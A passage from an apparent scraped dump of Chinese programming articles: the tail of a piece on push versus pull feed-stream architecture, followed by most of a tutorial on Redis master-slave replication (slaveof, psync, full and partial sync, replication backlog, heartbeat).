流， 拉模型完全可以扛得住。</p>\n<p>我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个 Feed 流，有这样一个明确经验可以帮助你快速做出决定。</p>\n<p>另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。</p>\n<ul>\n<li><b>推模型的原罪</b></li>\n</ul>\n<p>上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。</p>\n<p><b>耗存储</b>。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大 V 有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。</p>\n<p><b>写峰值。</b>推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大 V 发布完内容，触发离线写任务推给各个粉丝。可大 V 是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的 worker 数可能用不了几个，可一旦大 V 发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker 数量自动化跟着调整，峰值来了的时候，worker 自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed 流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大 V 发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大 V 走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。</p>\n<p><b>避不开的业务逻辑。</b>这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。</p>\n<p>不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。</p>\n<h2><b>0x03 关于数据</b></h2>\n<p>模型的事情就不过多说了，再来聊几个关于数据的具体问题。</p>\n<ul>\n<li><b>有状态与无状态</b></li>\n</ul>\n<p>这是 Feed 流的 API 接口设计相关的问题。</p>\n<p>举个例子，在拉取 Feed 流数据时候， API 层面基于数量 offset/limit 的分页方案是完全不行的，因为用户 Feed 流的新数据会 insert 到流最开始位置，仅仅给出 offset 会导致分页数据错乱，所以会给出一种 after/limit 的分页方案，就是有一个标志数据，意义是“从 after 这个数据向后取 limit 条数据”；但是，这仅仅是一个干净的 Feed 流的情况下，在实际的业务需求中，Feed 流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。</p>\n<p>以分页这个例子来说，它为什么会这么脆弱呢? 我总结是因为 API 的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于 Feed 流的一些时候这些值不够用，导致数据拉取变得棘手。</p>\n<p>所以，如果 Feed 流的数据获取是有状态就好了，就像浏览器与服务器之间的 Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。</p>\n<ul>\n<li><b>数据 Format</b></li>\n</ul>\n<p>通常，Feed 流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的 Format，这个过程是个性能黑洞，经常包含了很多 IO，你可能要读大量存储，读大量 RPC来获取到数据才能成功组装。所以针对数据 Format 有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。</p>\n<p>要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。</p>\n<p>而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。</p>\n<ul>\n<li><b>过滤</b></li>\n</ul>\n<p>几乎所有的 Feed 流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。</p>\n<p>过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。</p>\n<h2><b>0x04 结语</b></h2>\n<p>Feed 流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。</p>\n</div>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/30091aff79e77ecbab99678473d262ea.jpeg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/d0895096265ab585cdb52a0119e21608.jpeg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114156\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114156votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114156\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">v7</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/2976e1383dc6fd216901213fcff13ae4.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            微博：@_v7__        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/vincent7\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/vincent7/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/2135822193\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：vince_yang\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,API,Feed,架构设计", "author": "伯乐在线", "front_image_path": "full/eb63456a872d5c2ffd8306369d8fe47503161e04.jpg"}
{"title": "深入学习 Redis（3）：主从复制", "createdate": "2018/07/05", "url": "http://blog.jobbole.com/114194/", "url_object_id": "aa95d1c9ae4721218650bfa651e5af8c", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9236731.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在前面的两篇文章中，分别介绍了<a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">Redis的内存模型</a>和<a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">Redis的持久化</a>。</p>\n<p>在Redis的持久化中曾提到，Redis高可用的方案包括持久化、主从复制（及读写分离）、哨兵和集群。其中持久化侧重解决的是Redis数据的单机备份问题（从内存到硬盘的备份）；而主从复制则侧重解决数据的多机热备。此外，主从复制还可以实现负载均衡和故障恢复。</p>\n<p>这篇文章中，将详细介绍Redis主从复制的方方面面，包括：如何使用主从复制、主从复制的原理（重点是全量复制和部分复制、以及心跳机制）、实际应用中需要注意的问题（如数据不一致问题、复制超时问题、复制缓冲区溢出问题）、主从复制相关的配置（重点是repl-timeout、client-output-buffer-limit slave）等。</p>\n<h1>一、主从复制概述</h1>\n<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>\n<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>\n<p><strong>主从复制的作用</strong></p>\n<p>主从复制的作用主要包括：</p>\n<ol>\n<li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li>\n<li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li>\n<li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li>\n<li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li>\n</ol>\n<h1>二、如何使用主从复制</h1>\n<p>为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。</p>\n<h2>1. 建立复制</h2>\n<p>需要注意，<strong>主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</strong></p>\n<p>从节点开启主从复制，有3种方式：</p>\n<p>（1）配置文件</p>\n<p>在从服务器的配置文件中加入：slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（2）启动命令</p>\n<p>redis-server启动命令后加入 –slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（3）客户端命令</p>\n<p>Redis服务器启动后，直接通过客户端执行命令：slaveof &lt;masterip&gt; &lt;masterport&gt;，则该Redis实例成为从节点。</p>\n<p>上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p>\n<h2>2. 实例</h2>\n<h3>准备工作：启动两个节点</h3>\n<p>方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/f8bd402c8f2c061e530425c73a3ca8a3.png\" alt=\"\"></p>\n<p>启动后可以看到：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6086f737e5512ad04968c73ccfd825eb.png\" alt=\"\"></p>\n<p>两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。</p>\n<h3>建立复制</h3>\n<p>此时在6380节点执行slaveof命令，使之变为从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/52a970ef1267bd05592c3eaf1f6adbb5.png\" alt=\"\"></p>\n<h3>观察效果</h3>\n<p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p>\n<p>（1）首先在从节点查询一个不存在的key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1b0f72f0a25b24ae841a94ebcab8aff3.png\" alt=\"\"></p>\n<p>（2）然后在主节点中增加这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6ea8e7f7f1e7e7366f01ae2826a156cb.png\" alt=\"\"></p>\n<p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/568a21042ea667791b9ded398157ea9e.png\" alt=\"\"></p>\n<p>（4）然后在主节点删除这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/a5374ed7f3c9561b164960079fb1a4a2.png\" alt=\"\"></p>\n<p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/69f2bbaf2104ed754714c1b9c7c130a2.png\" alt=\"\"></p>\n<h2>3. 断开复制</h2>\n<p>通过slaveof &lt;masterip&gt; &lt;masterport&gt;命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p>\n<p>从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/26021476cbfc7cc0057ec1705832bbb5.png\" alt=\"\"></p>\n<p>主节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/068ea8d21fff8628cb3a083e021cf01e.png\" alt=\"\"></p>\n<h1>三、主从复制的实现原理</h1>\n<p>上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。</p>\n<p>主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。</p>\n<h2>1. 连接建立阶段</h2>\n<p>该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。</p>\n<h3>步骤1：保存主节点信息</h3>\n<p>从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。</p>\n<p>需要注意的是，<strong>slaveof</strong><strong>是异步命令，从节点完成主节点ip</strong><strong>和port</strong><strong>的保存后，向发送slaveof</strong><strong>命令的客户端直接返回OK</strong><strong>，实际的复制操作在这之后才开始进行。</strong></p>\n<p>这个过程中，可以看到从节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/91ae1117c30e1084ea85c3a44be915ab.png\" alt=\"\"></p>\n<h3>步骤2：建立socket连接</h3>\n<p>从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：</p>\n<p>从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。</p>\n<p>主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，<strong>并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。</strong></p>\n<p>这个过程中，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/161e84d3812ffe96a64c49b818e16d9b.png\" alt=\"\"></p>\n<h3>步骤3：发送ping命令</h3>\n<p>从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。</p>\n<p>从节点发送ping命令后，可能出现3种情况：</p>\n<p>（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。</p>\n<p>（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。</p>\n<p>（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。</p>\n<p>在主节点返回pong情况下，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9f778e5fa051775c362d32c8b6ca745e.png\" alt=\"\"></p>\n<h3>步骤4：身份验证</h3>\n<p>如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。</p>\n<p>如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。</p>\n<h3>步骤5：发送从节点端口信息</h3>\n<p>身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。</p>\n<h2>2. 数据同步阶段</h2>\n<p>主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。</p>\n<p>数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。</p>\n<p>需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。</p>\n<h2>3. 命令传播阶段</h2>\n<p>数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。</p>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。</p>\n<p><strong>延迟与不一致</strong></p>\n<p>需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。</p>\n<p>repl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。</p>\n<p>一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。</p>\n<h1>四、【数据同步阶段】全量复制和部分复制</h1>\n<p>在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。</p>\n<ol>\n<li>全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。</li>\n<li>部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。</li>\n</ol>\n<h2>1. 全量复制</h2>\n<p>Redis通过psync命令进行全量复制的过程如下：</p>\n<p>（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。</p>\n<p>（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令</p>\n<p>（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；<strong>从节点首先清除自己的旧数据，然后载入接收的</strong><strong>RDB</strong><strong>文件</strong>，将数据库状态更新至主节点执行bgsave时的数据库状态</p>\n<p>（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态</p>\n<p>（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态</p>\n<p>下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。</p>\n<p>主节点的打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/53f6cbf8a51c88138c65167cf4fe7e0c.png\" alt=\"\"></p>\n<p>从节点打印日志如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ed55e49faf7e91f04d1a4f4c4b00e11b.png\" alt=\"\"></p>\n<p>其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。</p>\n<p>通过全量复制的过程可以看出，全量复制是非常重型的操作：</p>\n<p>（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a></p>\n<p>（2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗</p>\n<p>（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗</p>\n<h2>2. 部分复制</h2>\n<p>由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。</p>\n<p>部分复制的实现，依赖于三个重要的概念：</p>\n<h3>（1）复制偏移量</h3>\n<p>主节点和从节点分别维护一个复制偏移量（offset），代表的是<strong>主节点向从节点传递的字节数</strong>；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。</p>\n<p>offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。</p>\n<h3>（2）复制积压缓冲区</h3>\n<p>复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。</p>\n<p>在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。</p>\n<p>由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。</p>\n<p>从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：</p>\n<ul>\n<li>如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；</li>\n<li>如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。</li>\n</ul>\n<h3>（3）服务器运行ID(runid)</h3>\n<p>每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9d9f5a1f900cc62a58b99c84afceb108.png\" alt=\"\"></p>\n<p>主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：</p>\n<ul>\n<li>如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；</li>\n<li>如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。</li>\n</ul>\n<h2>3. psync命令的执行</h2>\n<p>在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。</p>\n<p>psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/539735ab6935ec04a11e4eae532473b4.png\" alt=\"\"></p>\n<p>（1）首先，从节点根据当前状态，决定如何调用psync命令：</p>\n<ul>\n<li>如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制；</li>\n<li>如果从节点之前执行了slaveof，则发送命令为psync &lt;runid&gt; &lt;offset&gt;，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。</li>\n</ul>\n<p>（2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：</p>\n<ul>\n<li>如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；</li>\n<li>如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；</li>\n<li>如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC &lt;runid&gt; &lt;offset&gt;，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。</li>\n</ul>\n<h2>4. 部分复制演示</h2>\n<p>在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。</p>\n<p><strong>网络中断</strong></p>\n<p>网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/02bba87c0eb1a8af6f181ae3c99e1ab2.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/417f7451c637e34e8ea8727df6140920.png\" alt=\"\"></p>\n<p><strong>网络恢复</strong></p>\n<p>网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1600a7bbcdfc26e6bb286885f84f3353.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad33fbcc87156992bb9ffc7a45c18032.png\" alt=\"\"></p>\n<h1>五、【命令传播阶段】心跳机制</h1>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。</p>\n<h2>1.主-&gt;从：PING</h2>\n<p>每隔指定的时间，<strong>主节点会向从节点发送</strong><strong>PING</strong><strong>命令</strong>，这个PING命令的作用，主要是为了让从节点进行超时判断。</p>\n<p>PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。</p>\n<p>关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：</p>\n<p><img class=\"aligncenter\" 